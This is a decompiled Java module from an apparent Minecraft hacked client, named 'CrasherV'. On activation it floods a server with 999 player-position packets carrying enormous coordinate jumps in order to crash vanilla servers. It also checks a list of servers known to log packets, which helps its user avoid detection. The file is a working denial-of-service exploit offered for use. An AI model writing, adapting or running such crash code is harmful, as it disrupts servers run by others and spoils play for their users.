/*
 * Decompiled with CFR 0_118.
 */
package it.nobusware.client.mods.crashers;

import it.nobusware.client.manager.Module;
import it.nobusware.client.mods.FindPacketLog;
import it.nobusware.client.utils.ChatUtils;
import net.minecraft.network.play.client.C03PacketPlayer;

public class CrasherV extends Module {

	public CrasherV(String nome_mod, int tasto, String nome_array_printed, Category categoria) {
		super(nome_mod, tasto, nome_array_printed, categoria);
		setDangerous(true);
	}

	public static boolean active;

	@Override
	public void Abilitato() {
		if(FindPacketLog.packetlog.contains(mc.getCurrentServerData().serverIP)) {
			ChatUtils.print("Questo Server Packetlogga!");
			this.toggle();
		}
		active = true;
		int index = 0;
		while (index < 999) {
			mc.getNetHandler()
			.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(
			CrasherV.mc.thePlayer.posX + (double) (99999 * index),
			CrasherV.mc.thePlayer.getEntityBoundingBox().minY + (double) (99999 * index),
			CrasherV.mc.thePlayer.posZ + (double) (99999 * index), true));
			++index;
		}
		ChatUtils.print("Trying to crash with method V ( vanilla )");
		ChatUtils.print("Only works on vanilla servers");
	}

	@Override
	public void Disabilitato() {
		active = false;
	}
}